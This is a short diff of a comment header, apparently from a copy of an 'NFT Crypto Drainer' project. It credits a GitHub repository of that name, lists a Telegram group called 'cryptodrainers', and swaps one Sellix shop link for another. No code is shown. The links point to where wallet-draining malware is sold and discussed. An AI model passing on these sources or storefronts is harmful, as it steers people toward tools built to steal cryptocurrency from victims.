@@ -1,6 +1,6 @@
 /* 
     Credits: https://github.com/0x32Moon/NFT-Crypto-Drainer
-    Shop: https://nftservices.sellix.io/
+    Shop: https://tec.sellix.io/
     Telegram group: https://t.me/cryptodrainers
 */
 
